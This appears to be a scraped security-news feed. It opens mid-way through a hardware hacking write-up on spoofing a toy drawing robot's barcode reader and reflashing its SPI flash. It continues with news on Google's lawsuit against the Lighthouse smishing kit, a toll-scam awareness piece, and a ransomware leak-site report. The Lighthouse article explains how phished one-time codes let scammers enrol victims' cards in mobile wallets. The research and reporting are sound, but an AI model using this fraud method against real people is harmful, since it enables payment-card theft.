On the bottom we have a few ultra-recessed screw-holes. You'd think at this point I'd be properly equipped to deal with these, but I'm not. Without fail, every hardware assesment helps me realize what I still don't have (besides patience). No matter how many specialized tools or components I amass in my home lab, there's always something that I end up having to buy. At this point I could have easily purchased what I needed for same or next-day delivery, but that would require patience. I could have probably 3D printed something to do the job. Again, I'm not that patient.

What I lack in patience I make up for in power tools. I ended up using a combination of, well, drilling the hole slightly bigger to clear some of my screwdriver bits, and chaining bits together.

With the four recessed screws removed, the top half popped off without much additional trouble.

With the barcode reader exposed, I tried some very basic preliminary fuzzing by taking a valid card and shifting it around to provide unexpected input. When a card is placed over the sensors, the device makes a sound and then announces the associated image.

While fuzzing, various images were announced, all of which seemed to match up with other cards I had seen in the deck, until the robot announced "Take a bath!" This seemed odd (and mildly offensive), so I rummaged through the deck and could not for the life of me find any cards with bath imagery.

With the card held in place, I pushed the button to initiate drawing. The robot started singing and, surely enough, drew this image:

## Goals

Now that I had a decent idea what I was working with, I set the following two goals for myself:

1. Enumerate and identify all available drawings. The cards clearly don’t tell the whole story here.

2. The classic goal at Atredis: Put a Bird on It™ (i.e. figure out how these drawings are represented and stored, and use this information to add our own).


## Components

My next step was to identify the components on the board and see what I could gather/dump. The three juicy ones are labelled below.

- LKS32MC07x - ARM Cortex-M0 MCU

- uc25IQ64 - 64MB SPI NOR flash

- uc25IQ128A - 128MB SPI NOR flash


I was able to dump the 64MB flash via its SPI interface, had no luck with the 128MB flash, and also had no luck connecting to the MCU via SWD. Not a great start, but i was undeterred.

## Barcode Analysis

Using a multimeter and the printed trace lines, we can map the connections for the optical sensors that read the barcode to determine which card is inserted.

I was initially stumped by the fact that there was some overlap between the sensors and the pins. In my research, I came upon the concept of input multiplexing. Essentially, the board will power sensors 1-5 using VCC 1, then read the values on the input pins. Then it powers sensors 6-8 using VCC 2, and reuses the same input pins to read those values.

To test this theory, I decided to hook a logic analyzer up to the various inputs. To keep myself sane, I replaced the original all-red-wired connector with two sets of color-coded custom ones broken out to a breadboard with two rows of headers between them. This setup would facilitate both passive analysis and active signal manipulation simultaneously.

Sure enough, the VCC lines alternated at a regular cadence, lending massive credibility to the multiplexing theory.

With everything connected to the Saleae, I could now observe the behavior when a card was scanned. I chose the card corresponding to barcode value 00000001 to hopefully make the data more obvious to recognize. With the crab card in place, I would expect the rightmost sensor to register the HIGH value, while the others would register LOW. Well, as you can see below, the orientation of the barcode is swapped on the backside, so in reality the leftmost sensor is registering the HIGH value. I wish I could say I noticed this right away. I really wish I could say that.

Once I figured that out, the data matched up with our expectations. During the VCC1 phase, sensors 1-5 are powered and the pins are read. Sensor 1 (leftmost) is our sole HIGH (1) in this case; sensors 2 through 5 are LOW (0). Then in VCC2 phase, sensors 6-8 are powered and the pins are once more read; the corresponding values make up the final 3 bits of our barcode, for a final value of 00000001. I have the VCC triggers shown in reverse order below (i.e. VCC2 before VCC1) to make the barcode value more clear, but this process repeats several times with consistent values, so the ordering is not relevant.

In hardware analysis, these are the moments I live for. The way I outline it here, It seems so straightforward and obvious (if I did my job correctly), but for me, the path here was sprinkled with failures, confusion, wiring mistakes, and several consultations with my coworker Chad(GPT).

Anyway let’s test this out with a more complex barcode. The hot dog card has a barcode value of 01000111.

## Barcode Emulation

Now that we understand how barcodes are translated into signals, we can emulate them using a programmable form of input. I opted to use a Raspberry Pi, as it can operate at 3.3V and seemed perfect for this use case.

First, we need to map each relevant pin on the sensor board to a GPIO pin on the pi. I'm using red to represent the VCC lines, but as you can see, they're actually mapped to GPIO pins here. Since we don't actually need to power a board, we're using these lines as input, so we can track the power cycles and know which sets of “sensors" are being read, and which barcode bits they correspond to.

With everything wired, the next step is to script up the logic to loop through the decimal values 1 through 256, convert to binary, chunk that binary up into two groups, and write the appropriate values to the GPIO pins based on which phase of the VCC multiplexing cycle we’re in.

```
import gpiod import time chip = gpiod.Chip("gpiochip0") #inputs: # VCC1 (GPIO23) # VCC2 (GPIO5) vcc1 = chip.get_line(23) vcc2 = chip.get_line(5) vcc1.request(consumer="vcc1", type=gpiod.LINE_REQ_DIR_IN) vcc2.request(consumer="vcc2", type=gpiod.LINE_REQ_DIR_IN) #outputs: # D1/6 (GPIO2) # D2/7 (GPIO3) # D3/8 (GPIO4) # D4 (GPIO17) # D5 (GPIO27) outputs = chip.get_lines([2, 3, 4, 17, 27]) outputs.request(consumer="barcode", type=gpiod.LINE_REQ_DIR_OUT) try: for bcode in range(1, 256): #convert to 8-bit binary string, then list of bits bits = [int(b) for b in format(bcode, '08b')] print(f"{bcode} ({bits})") #split into two groups from the right with order reversed (i.e. LSB first) #e.g. 204 ([1,1,0,0,1,1,0,0]) -> [0,0,1,1,0] & [0,1,1] group1 = bits[-5:][::-1] group2 = bits[:-5][::-1] last_vcc1 = 0 last_vcc2 = 0 start = time.time() while time.time() - start < 4: #let each barcode "sit" for 4 seconds v1 = vcc1.get_value() v2 = vcc2.get_value() #on VCC1 rising edge -> emit group1 if v1 == 1 and last_vcc1 == 0: out = group1 outputs.set_values(out) time.sleep(0.02) outputs.set_values([1, 1, 1, 1, 1]) #on VCC2 rising edge -> emit group2 on D1–D3, hold D4–5 HIGH if v2 == 1 and last_vcc2 == 0: out = group2 + [1, 1] outputs.set_values(out) time.sleep(0.02) outputs.set_values([1, 1, 1, 1, 1]) last_vcc1 = v1 last_vcc2 = v2 outputs.set_values([1, 1, 1, 1, 1]) time.sleep(2) except KeyboardInterrupt: outputs.set_values([1, 1, 1, 1, 1]) outputs.release() vcc1.release() vcc2.release()
```

It took a ton of trial and error, tweaking, logic analysis, wire rechecks, and cursing to get to this point.

While looping through every possible image, I painstakingly wrote down what I heard. In some cases, I really could not decipher the audio. In those cases, I would need to have the robot actually draw the image and hope it made sense.

With this “lookup” file, I modified the script to also print out the text along with the numeric value. Now I could pinpoint the oddballs and draw them, like the example below where I heard “chain block.”

```
$ python3 all-barcodes.py 218 ([1, 1, 0, 1, 1, 0, 1, 0]) 218: chain block?
```

Cool yes, seems plausible.

With this approach, I filled in some of the gaps and identified some of the “hidden” images that weren’t represented by the included cards.

The full set of available images can be seen below. The stack of cards provided with the robot include images 1 through 100. Everything beyond that is a mysterious hidden bonus.

With my first goal achieved, it was time to move on to potentially getting this thing to draw arbitrary images.

## Drawing Analysis

To be able to draw our own images, we need to understand how images are represented, where they’re stored, and whether we have the ability to overwrite these values. When I first opened this thing up, I was only able to dump the smaller of the two flash chips, so I had to hope this is where the images files lived or figure out how to dump the larger chip as well.

Going back to my initial flash dump, the hex output looked to contain a directory entry layout with some numeric filenames, which seemed promising.

```
$ xxd UC25IQ64.bin | head -n 20 00000000: 1972 81a6 2000 0000 80b0 5600 03ff 0000 .r.. .....V..... 00000010: 7465 7374 5f64 6972 00ff ffff ffff ffff test_dir........ 00000020: 42ae 43d2 2045 0000 ac0f 0000 02ff 0000 B.C.

```

A typical directory entry layout looks a bit like the following:

```
Directory entry layout (32 bytes total) 0x00 0x04 0x08 0x0C 0x10 0x20 ┌───────────────┬──────────────┬─────────────┬─────────────┬──────────────────────────┐ │ CRC / checksum│ START offset │ SIZE │ FLAGS │ NAME (ASCII, 16 bytes) │ │ (uint32 LE) │ (uint32 LE) │ (uint32 LE) │ (uint32 LE) │ null-terminated │ └───────────────┴──────────────┴─────────────┴─────────────┴──────────────────────────┘
```

For example, the directory entry for `001.fla` has the following content breakdown:

```
[FILE] Entry @ 0x000020 (32 bytes) name='001.f1a' +--------+-------------------------------------------------+ +------------------+ | Offset | HEX | | ASCII | +--------+-------------------------------------------------+ +------------------+ | 0x00 | 42 AE 43 D2 20 45 00 00 AC 0F 00 00 02 FF 00 00 | | B.C. E.......... | | 0x10 | 30 30 31 2E 66 31 61 00 FF FF FF FF FF FF FF FF | | 001.f1a......... | +--------+-------------------------------------------------+ +------------------+ Field map: [0x00..0x03] CRC / checksum (LE) = 0xD243AE42 [0x04..0x07] START offset (LE) = 0x004520 [0x08..0x0B] SIZE bytes (LE) = 0xFAC [0x0C..0x0F] FLAGS / unk (LE) = 0x0000FF02 [0x10..0x1F] NAME (ASCII, null-term) = '001.f1a' Content slice: data[0x004520 : 0x0054CC] (len=0xFAC)
```

Knowing this, we can semi-shamefully vibe code a High Level Analyzer (HLA) in Logic to identify all SPI `flash_read` operations, take the associated read address from the `fast_read`, perform a lookup against our directory entry layout, and print the associated filename to show what is being read at that moment.

With the HLA in place, I had the bot read and draw image number 105. Sure enough, it read the file `Y105.f1a`. However, it read several other files during the course of drawing, including `TE05luo2.f1a`, `TXXm5.f1b`, and `TE08stop.f1a`. When I scanned other cards, the associated `YXXX.f1a` file was read, even if I never drew the image. The pattern of these other reads seemed to line up with whenever the robot would talk or sing. This led me to believe that I was actually looking at the audio files, not the drawings.

It was time to go after that second SPI flash chip again. Fortunately I learned from my trusted colleague Chris Bellows that, when in doubt, go for the chip-off extraction. This was successful and a good time was had by all.

```

Side note - with this SPI flash chip removed from the board, the drawbot still functioned. It would power on, read and announce cards, and play music. The one thing it did NOT do was actually move its arms and draw the images, which seemed like pretty intense proof that this chip contained the drawing files and the smaller flash chip contained the audio.

The contents of the extracted image looked very structured, which boded well for being some sort of coordinate-based data that one would expect for a drawing.

Because it's the year 2025 and LLMs are coming for our jobs anyway, I thought I would give ChatGPT a chance to make short work of my analysis. I fed it the dump, said I suspected that it contained image instruction files, and sent it on its way.

Putting aside the excessive flattery and overall semi-off-putting vibe of my ChatGPT, we’ve got it!

Only problem is, there appear to be only 35 images within the file. The first 35 images to be exact. Since this is an atypical chip, it's possible that flashrom is making incorrect assumptions. We know from the spec that we should have 16MB of data, so we can force it to read 16MB by specifying a target chip similar enough to ours. I've done several extractions of Winbond flash, so that’s what I went with, and the new dump contained 254 images.

Since we now know the structure, we can script up a parser/generator in Python that will carve out the data for each image, process the coordinates, and feed them into SVG path elements to create an image file. An excerpt of this script can be seen here:

```
def write_svg(strokes, out: Path, flip_y=True, stroke_w=2): bb = bbox(strokes) if not bb: return False xmin, ymin, xmax, ymax = bb w, h = xmax - xmin + 1, ymax - ymin + 1 with out.open("w", encoding="utf-8") as f: if flip_y: f.write(f'\n') f.write(f' \n\n') else: f.write(f'\n') for s in strokes: f.write(' \n'.format( s[0][0], s[0][1], " ".join(f"L{x},{y}" for x, y in s[1:]))) f.write('\n') return True def main(): ap = argparse.ArgumentParser(description="Extract SVGs from fixed slots") ap.add_argument("bin", type=Path, help="full flash dump (e.g., full.bin)") ap.add_argument("--out", type=Path, default=Path("svgs"), help="output directory") ap.add_argument("--base", type=lambda x:int(x,0), default=0x04, help="first slot start offset (default 0x04)") ap.add_argument("--slot", type=lambda x:int(x,0), default=0xEA60, help="slot size (default 0xEA60)") ap.add_argument("--count", type=int, default=None, help="number of slots (default: autodetect from file size)") ap.add_argument("--min-pts", type=int, default=2, help="min points to export (default 2)") ap.add_argument("--no-flip-y", action="store_true", help="do not flip Y axis") args = ap.parse_args() data = args.bin.read_bytes() size = len(data) if args.count is None: # Best-effort autodetect usable = max(0, size - args.base) args.count = usable // args.slot args.out.mkdir(parents=True, exist_ok=True) exported = 0 for i in range(args.count): off = args.base + i * args.slot if off >= size: break slot = data[off : min(off + args.slot, size)] words = u16be_words(slot) strokes = strokes_from_slot(words) if sum(len(s) for s in strokes) < args.min_pts: continue svg_path = args.out / f"drawing_{i:03d}.svg" if write_svg(strokes, svg_path, flip_y=not args.no_flip_y, stroke_w=2): exported += 1 # uncomment for debug: # print(f"{i:03d} @ 0x{off:08X} -> {svg_path.name}") print(f"Exported {exported} SVGs to {args.out} from {args.count} slots " f"(base=0x{args.base:X}, slot=0x{args.slot:X}).")
```

Because this was written by an LLM, it is a bit.. _extra_. It could likely be simplified, but in its current state, it lets you specify the slot offset where you’d like to start extracting images, the number of sequential images to extract, the minimum number of points it must detect before it considers an entry a valid image, and the ability to flip the image when rendering (since it draws from the top, it actually stores the images upside-down).

```
> python3 img_carver.py ../dumps/UC25IQ128_forced.bin --no-flip-y --out svgs Exported 254 SVGs to svgs from 279 slots (base=0x4, slot=0xEA60).
```

Well this would have been a more straightforward way to view all possible images without enumerating and spoofing them, but hey, there are many ways to skin a cat and I’d like to learn them all. There are a lot of cats in this world that need skinning.

Now that we can go from raw data -> SVG, we want to go in the other direction to get this thing to draw an image of our choosing. There are a lot of tools out there to convert a PNG to an SVG, and below you can see why the latter is much more suited to our needs. SVGs are scalable because they contain path data that can be easily transformed with the power of maths.

With our target image, we just need to parse through the path data and transform it into the data format that drawbot expects. Since the flash memory is just one big blob and we’re hoping to only overwrite one image (i.e. the other drawings will still work), we need to make sure our padding is correct and that we follow the expected format, including any necessary delimiters. As we could see from the crab drawing ChatGPT spit out, it didn’t quite seem to process the “pen up” actions properly, so every movement drew a line. Luckily for me, my drawing is a single continuous line, so I don’t have to worry about that quite yet.

Here’s an excerpt of my final script. It takes an existing slot, determines the bounding box, fits the new SVG into the coordinate plane’s bounding box, then creates a new slot that’s the same size as the one to be replaced.

```
def main(): ap = argparse.ArgumentParser(description="Fit an SVG to a slot's bbox and pack to device format") ap.add_argument("slot_content", type=Path, help="existing slot content (0xEA5C bytes; starts at first X)") ap.add_argument("svg", type=Path, help="SVG to insert") ap.add_argument("--out", type=Path, default=Path("slot_new_content.bin"), help="output content-only bin (0xEA5C)") ap.add_argument("--out-with-marker", type=Path, help="also write a 0xEA60 file with trailing FFFF FFFF") ap.add_argument("--step", type=float, default=4.0, help="sampling step in SVG units (bigger = fewer points)") ap.add_argument("--margin", type=float, default=0.0, help="margin in device units inside target bbox (default 0)") ap.add_argument("--flip-y", action="store_true", help="flip Y if your preview is upside-down") args = ap.parse_args() slot_bytes = args.slot_content.read_bytes() if len(slot_bytes) != CONTENT_LEN and len(slot_bytes) != SLOT_LEN: print(f"[warn] slot_content length is {len(slot_bytes)}; expected 0xEA5C or 0xEA60. Continuing...") # Derive target bbox from existing slot content (robust to trailing marker) bb = parse_bbox_from_slot_content(slot_bytes[:CONTENT_LEN]) print(f"[info] target bbox (from slot): x[{bb[0]}..{bb[2]}], y[{bb[1]}..{bb[3]}]") # Load & sample SVG paths, _, svg_attr = svg2paths2(str(args.svg)) vb = get_svg_viewbox(paths, svg_attr) # Build strokes list (each continuous subpath = one stroke) strokes: List[List[Point]] = [] for p in paths: for sub in p.continuous_subpaths(): strokes.append(sample_path(sub, args.step)) qstrokes = quantize_to_bbox(strokes, vb, bb, margin=args.margin, flip_y=args.flip_y) payload = pack_content(qstrokes, CONTENT_LEN) args.out.write_bytes(payload) print(f"[done] wrote {args.out} ({len(payload)} bytes).”) […]
```

```
$ python3 svg_fit_to_slot.py slot_006_content.bin ../images/whisky-outline.svg --out slot_006_new_content_03.bin --step 6.0 --margin 4 [info] target bbox (from slot): x[56..1124], y[176..1005] [done] wrote slot_006_new_content.bin (59996 bytes).

$ xxd slot_006_new_content_03.bin 00000000: 024c 02ce 024a 02cd 0248 02cb 0246 02c9 .L...J...H...F.. 00000010: 0244 02c8 0243 02c6 0241 02c3 0240 02c1 .D...C...A...@.. 00000020: 023f 02bf 023e 02be 023c 02bf 0239 02c0 .?...>...<...9.. 00000030: 0237 02c1 0234 02c2 0232 02c3 022f 02c3 .7...4...2.../.. 00000040: 022d 02c3 022a 02c1 0228 02c0 0227 02be .-...*...(...'.. 00000050: 0226 02bc 0225 02b9 0224 02b7 0223 02b4 .&...%...$...#.. 00000060: 0223 02b2 0223 02af 0223 02ac 0222 02ab .#...#...#...".. 00000070: 0221 02ac 0220 02ae 021e 02b1 021c 02b3 .!... .......... 00000080: 021a 02b5 0218 02b6 0216 02b8 0214 02b9 ................ 00000090: 0211 02b9 020f 02b9 020c 02b7 020a 02b6 ................ […]
```

Now that we’ve overwritten a single slot, we need to write it back into the original image.

```
$ dd if=slot_006_new_content_03.bin of=UC25IQ128_trunc_mod.bin bs=1 seek=$((0x000493E4)) conv=notrunc 59996+0 records in 59996+0 records out 59996 bytes transferred in 0.120694 secs (497092 bytes/sec)
```

I _should_ have confirmed that we could write to the flash chip before even going down this path. Fortunately, we could.

```
$ sudo flashrom -p buspirate_spi:dev=/dev/ttyUSB0,spispeed=250k -f -w UC25IQ128_trunc_mod.bin -VV flashrom unknown on Linux 6.8.0-60-generic (aarch64) flashrom is free software, get the source code at https://flashrom.org Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). flashrom was built with GCC 13.2.0, little endian […] Found Unknown flash chip "SFDP-capable chip" (2048 kB, SPI). === This flash part has status UNTESTED for operations: WP … Block protection is disabled. Reading old flash chip contents... done. Erasing and writing flash chip... Trying erase function 0… Erase/write done. Verifying flash... VERIFIED. Raw bitbang mode version 1 Bus Pirate shutdown completed.
```

It was at this point that I remembered that the chip wasn’t actually installed into the drawbot anymore. Since nothing ever works on the first try, this was very likely a problem. I already had it installed on this nice breakout board with headers, so I soldered wires to the board itself, globbed on hot glue to try and keep them from ripping off of the board, and hooked them up to connectors on the other side. This way, I could switch back and forth between my programmer and the drawbot until it was just right.

It took a few iterations where I had to work out some minor kinks, but it actually worked. I couldn’t have some gnarled headless robot in my final demo, so I modified the the case to accommodate its flash chip hanging out and patched it back up as best I could.

If you’d like to watch the whole video, you’ll get to hear one of the many drawbot songs that have been stuck in my head during the course of this project.

A potential area of future work would be streamlining this process to facilitate passing an image to a script that would handle conversion, writing to flash, and triggering the drawing (more GPIO manipulation with the pi) all at once. It would also be fun to figure out the audio format to replace the various songs and sounds (I did spend a little time attempting to decode and play them using ffmpeg). I also considered overhauling the drawbot entirely, designing and 3d-printing a new body.

It’s entirely possible that I’ll come back and try one or all of these things in the future. If I do and anything comes of it, I’ll be sure to let you know.

What’s more likely is that I’ll find a new target to respectfully butcher and reanimate. Will keep you posted either way.

Happy hacking!]]></content:encoded></item><item><title>Google Sues to Disrupt Chinese SMS Phishing Triad</title><link>https://krebsonsecurity.com/2025/11/google-sues-to-disrupt-chinese-sms-phishing-triad/</link><author>BrianKrebs</author><category>security</category><pubDate>Thu, 13 Nov 2025 14:47:22 +0000</pubDate><source url="https://krebsonsecurity.com/">Krebs on Security</source><content:encoded><![CDATA[ is suing more than two dozen unnamed individuals allegedly involved in peddling a popular China-based mobile phishing service that helps scammers impersonate hundreds of trusted brands, blast out text message lures, and convert phished payment card data into mobile wallets from Apple and Google.In a lawsuit filed in the Southern District of New York on November 12, Google sued to unmask and disrupt 25 “John Doe” defendants allegedly linked to the sale of , a sophisticated phishing kit that makes it simple for even novices to steal payment card data from mobile users. Google said Lighthouse has harmed more than a million victims across 120 countries.A component of the Chinese phishing kit Lighthouse made to target customers of The Toll Roads, which refers to several state routes through Orange County, Calif.Regardless of the text message lure used or brand used, the basic scam remains the same: After the visitor enters their payment information, the phishing site will automatically attempt to enroll the card as a mobile wallet from Apple or Google. The phishing site then tells the visitor that their bank is going to verify the transaction by sending a one-time code that needs to be entered into the payment page before the transaction can be completed.If the recipient provides that one-time code, the scammers can link the victim’s card data to a mobile wallet on a device that they control. Researchers say the fraudsters usually load several stolen wallets onto each mobile device, and wait 7-10 days after that enrollment before selling the phones or using them for fraud.Google called the scale of the Lighthouse phishing attacks “staggering.” A May 2025 report from  found the domains used by the Smishing Triad are rotated frequently, with approximately 25,000 phishing domains active during any 8-day period.Google’s lawsuit alleges the purveyors of Lighthouse violated the company’s trademarks by including Google’s logos on countless phishing websites. The complaint says Lighthouse offers over 600 templates for phishing websites of more than 400 entities, and that Google’s logos were featured on at least a quarter of those templates.Google is also pursuing Lighthouse under the Racketeer Influenced and Corrupt Organizations (RICO) Act, saying the Lighthouse phishing enterprise encompasses several connected threat actor groups that work together to design and implement complex criminal schemes targeting the general public.According to Google, those threat actor teams include a “” that supplies the phishing software and templates; a “” that provides a list of targets; a “” that provides the tools to send fraudulent text messages in volume; a “,” in charge of monetizing the phished information; and an “,” which runs their Telegram support channels and discussion groups designed to facilitate collaboration and recruit new members.“While different members of the Enterprise may play different roles in the Schemes, they all collaborate to execute phishing attacks that rely on the Lighthouse software,” Google’s complaint alleges. “None of the Enterprise’s Schemes can generate revenue without collaboration and cooperation among the members of the Enterprise. All of the threat actor groups are connected to one another through historical and current business ties, including through their use of Lighthouse and the online community supporting its use, which exists on both YouTube and Telegram channels.”Silent Push’s May report observed that the Smishing Triad boasts it has “300+ front desk staff worldwide” involved in Lighthouse, staff that is mainly used to support various aspects of the group’s fraud and cash-out schemes.An image shared by an SMS phishing group shows a panel of mobile phones responsible for mass-sending phishing messages. These panels require a live operator because the one-time codes being shared by phishing victims must be used quickly as they generally expire within a few minutes.Google alleges that in addition to blasting out text messages spoofing known brands, Lighthouse makes it easy for customers to mass-create fake e-commerce websites that are advertised using Google Ads accounts (and paid for with stolen credit cards). These phony merchants collect payment card information at checkout, and then prompt the customer to expect and share a one-time code sent from their financial institution.Once again, that one-time code is being sent by the bank because the fake e-commerce site has just attempted to enroll the victim’s payment card data in a mobile wallet. By the time a victim understands they will likely never receive the item they just purchased from the fake e-commerce shop, the scammers have already run through hundreds of dollars in fraudulent charges, often at high-end electronics stores or jewelers. works in security research at SecAlliance, a CSIS Security Group company, and he’s been tracking Chinese SMS phishing groups for several years. Merrill said many Lighthouse customers are now using the phishing kit to erect fake e-commerce websites that are advertised on Google and Meta platforms.“You find this shop by searching for a particular product online or whatever, and you think you’re getting a good deal,” Merrill said. “But of course you never receive the product, and they will phish that one-time code at checkout.”Merrill said some of the phishing templates include payment buttons for services like , and that victims who choose to pay through PayPal can also see their PayPal accounts hijacked.A fake e-commerce site from the Smishing Triad spoofing PayPal on a mobile device.“The main advantage of the fake e-commerce site is that it doesn’t require them to send out message lures,” Merrill said, noting that the fake vendor sites have more staying power than traditional phishing sites because it takes far longer for them to be flagged for fraud.Merrill said Google’s legal action may temporarily disrupt the Lighthouse operators, and could make it easier for U.S. federal authorities to bring criminal charges against the group. But he said the Chinese mobile phishing market is so lucrative right now that it’s difficult to imagine a popular phishing service voluntarily turning out the lights.Merrill said Google’s lawsuit also can help lay the groundwork for future disruptive actions against Lighthouse and other phishing-as-a-service entities that are operating almost entirely on Chinese networks. According to Silent Push, a majority of the phishing sites created with these kits are sitting at two Chinese hosting companies:  (AS132203) and  (AS45102).“Once Google has a default judgment against the Lighthouse guys in court, theoretically they could use that to go to Alibaba and Tencent and say, ‘These guys have been found guilty, here are their domains and IP addresses, we want you to shut these down or we’ll include you in the case.'”If Google can bring that kind of legal pressure consistently over time, Merrill said, they might succeed in increasing costs for the phishers and more frequently disrupting their operations.“If you take all of these Chinese phishing kit developers, I have to believe it’s tens of thousands of Chinese-speaking people involved,” he said. “The Lighthouse guys will probably burn down their Telegram channels and disappear for a while. They might call it something else or redevelop their service entirely. But I don’t believe for a minute they’re going to close up shop and leave forever.”]]></content:encoded></item><item><title>1 million victims, 17,500 fake sites: Google takes on toll-fee scammers</title><link>https://www.malwarebytes.com/blog/news/2025/11/1-million-victims-17500-fake-sites-google-takes-on-toll-fee-scammers</link><author></author><category>threatintel</category><pubDate>Thu, 13 Nov 2025 14:43:06 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[A Phishing-as-a-Service (PhaaS) platform based in China, known as “Lighthouse,” is the subject of a new Google lawsuit.Lighthouse enables smishing (SMS phishing) campaigns, and if you’re in the US there is a good chance you’ve seen their texts about a small amount you supposedly owe in toll fees. Here’s an example of a toll-fee scam text:Google’s lawsuit brings claims against the Lighthouse platform under federal racketeering and fraud statutes, including the Racketeer Influenced and Corrupt Organizations Act (RICO), the Lanham Act, and the Computer Fraud and Abuse Act.The texts lure targets to websites that impersonate toll authorities or other trusted organizations. The goal is to steal personal information and credit card numbers for use in further financial fraud.As we reported in October 2025, Project Red Hook launched to combine the power of the US Homeland Security Investigations (HSI), law enforcement partners, and businesses to raise awareness of how Chinese organized crime groups use gift cards to launder money.These toll, postage, and refund scams might look different on the surface, but they all feed the same machine, each one crafted to look like an urgent government or service message demanding a small fee. Together, they form an industrialized text-scam ecosystem that’s earned Chinese crime groups more than $1 billion in just three years.Google says Lighthouse alone affected more than 1 million victims across 120 countries. A September report by Netcraft discussed two phishing campaigns believed to be associated with Lighthouse and “Lucid,” a very similar PhaaS platform. Since identifying these campaigns, Netcraft has detected more than 17,500 phishing domains targeting 316 brands from 74 countries.As grounds for the lawsuit, Google says it found at least 107 phishing website templates that feature its own branding to boost credibility. But a lawsuit can only go so far, and Google says robust public policy is needed to address the broader threat of scams:“We are collaborating with policymakers and are today announcing our endorsement of key bipartisan bills in the U.S. Congress.”Will lawsuits, disruptions, and even bills make toll-fee scams go away? Not very likely. The only thing that will really help is if their source of income dries up because people stop falling for smishing. Education is the biggest lever. Red flags in smishing messagesThere are some tell-tale signs in these scams to look for:Spelling and grammar mistakes: the scammers seem to have problems with formatting dates. For example “September 10nd”, “9st” (instead of 9th or 1st).you only have one or two days to pay. Or else…The over-the-top threats: Real agencies won’t say your “credit score will be affected” for an unpaid traffic violation. “Ohio Administrative Code 15C-16.003” doesn’t match any real Ohio BMV administrative codes. When a code looks fake, it probably is! Truly trusted organizations don’t send urgent “pay now or else” links by text.Vague or missing personalization: Genuine government agencies tend to use your legal name, not a generic scare message sent to many people at the same time.Recognizing scams is the most important part of protecting yourself, so always consider these golden rules:Always search phone numbers and email addresses to look for associations with known scams.When in doubt, go directly to the website of the organization that contacted you to see if there are any messages for you.Do not get rushed into decisions without thinking them through.Do not click on links in unsolicited text messages.Do not reply, even if the text message explicitly tells you to do so.If you have engaged with the scammers’ website:Immediately change your passwords for any accounts that may have been compromised. Contact your bank or financial institution to report the incident and take any necessary steps to protect your accounts, such as freezing them or monitoring for suspicious activity. Consider a fraud alert or credit freeze. To start layering protection, you might want to place a fraud alert or credit freeze on your credit file with all three of the primary credit bureaus. This makes it harder for fraudsters to open new accounts in your name.US citizens can report confirmed cases of identity theft to the FTC at identitytheft.gov.

During the third quarter of 2025, we monitored more than **85 active data leak sites** (DLS) that collectively listed **1,592 new victims**. Compared to the **1,607 victims reported in Q2** 2025, the publication rate remained stable though it is still **notably higher** than the 1,270 victims recorded in Q3 2024 (a 25% increase YoY). Overall, there are **approximately 520 to 540 new victims per month**, indicating that ransomware activity has plateaued albeit at historically high levels.

_Figure 1 – Total Number of Reported Ransomware Victims in DLS, per month._

Despite the termination of several prominent ransomware groups, the **overall number of active threat actors continues to grow**, with new ones appearing every month.

During Q3 2025, we observed a steady expansion of double-extortion activity, driven mostly by small and emerging operators. Of the 85 data leak sites tracked this quarter, **47 groups published fewer than ten victims**, suggesting a growing number of affiliates moving beyond established ransomware-as-a-service (RaaS) programs to conduct attacks independently.

This fragmentation follows the **closure or dormancy** of several major RaaS brands during the year, including RansomHub, 8Base, BianLian, Cactus, and others. In Q3 alone, 14 new groups began publishing victims, bringing the total number of **newly observed actors in 2025 to 45**. In Q1, the ten most active groups accounted for 71% of all DLS postings. In Q2, their share fell to 63%, and by Q3, to just 56%.

These findings illustrate the **limited long-term impact of law-enforcement operations** on the overall number of ransomware victims. Despite several high-profile takedowns during the past year—most of them directed at **large RaaS operations** such as **LockBit, 8Base, and Blacksuit**—the total volume of attacks did **not significantly decline**. Instead, the attacks continue a **gradual upward trend**, from an average of **approximately 420 victims per month in Q2–Q3 2024** to about **535 per month in the same period of 2025**.

This limited effect appears to stem from the **focus of enforcement efforts**: takedown operations primarily target **RaaS infrastructure and administrators**, which does not affect the **affiliate operators** who conduct the intrusions and drive the operational execution. When a major RaaS platform is disrupted, these affiliates typically **migrate to alternative programs or establish their own data-leak sites**, resulting in only short-term interruptions to overall activity levels.

The effects of **affiliate mobility** are evident both in the **proliferation of new leak sites** and in the **rising activity** of existing groups. **Qilin**, the most active actor in Q3 2025—and one of the most aggressive in recruiting former **RansomHub** affiliates—averaged around **75 victims per month**, up from **36 in Q1** prior to RansomHub’s closure in April. **INC Ransomware** increased its monthly total from **23 to 39** victims, and **Play** went from **28 to 33** during the same period.

This **ongoing fragmentation of the ecosystem** may further erode ransomware operators’ reliability. Victims traditionally rely on attackers reputation to supply decryption keys after payment. Large RaaS brands have a commercial incentive to maintain credibility and provide the keys, but smaller, short-lived groups do not, leading to reduced payment rates which are currently estimated at **25–40% of total attacks**.

In this context, the re-centralization of affiliates around major, recognizable brands remains strategically significant. Large RaaS programs preserve their market advantage through **stability, reputation, and structured affiliate infrastructure**. The **re-emergence of LockBit**, discussed in the following section, may represent precisely such a re-consolidation of affiliates under a **stable and trusted brand identity**.

_Figure 2 – Ransomware Groups by Publicly Claimed Victims – Q3 2025._

Qilin, Akira, INC Ransom, Play, and Safepay maintained their positions among the most active groups in Q3. Warlock and The Gentlemen emerged more recently, both demonstrating rapid early activity: Warlock began posting victims in June 2025 and reached 43 total listings in Q3, while The Gentlemen claimed 38 victims during a single month of operation in September 2025.

Until its disruption during Operation Cronos in early 2024, LockBit dominated the RaaS ecosystem, accounting for 20–30% of all published victims. Following the takedown, several arrests were announced, and successor groups — first RansomHub, then Qilin — attempted to inherit its affiliate base. However, the group’s core administrator, known as LockBitSupp, was never apprehended and in underground forums continued to hint at an eventual comeback.

The release of LockBit 5.0 in September 2025 marks the group’s return to active operations, reigniting questions about whether the RaaS landscape may again consolidate around this long-standing brand.

_Figure 3 – LockBit’s share of all DLS-published victims._

LockBit had long promised a comeback. In May 2025, following the latest in a series of public setbacks, the group’s administrator, LockBitSupp, responded on the RAMP underground forum, declaring that they would _“always rise up after being hacked.”_

_Figure 4 – LockBit administrator vowing to return on the RAMP forum._

_Figure 5 – LockBit administrator announcing the group’s return on RAMP chat._

The XSS Russian-language cybercriminal forum previously banned LockBitSupp following a dispute with another user and reaffirmed that “explicit advertising of RaaS will remain prohibited.” RaaS programs depend on affiliate recruitment for their business model and maintaining visibility on prominent criminal forums such as XSS or RAMP is essential to their work.

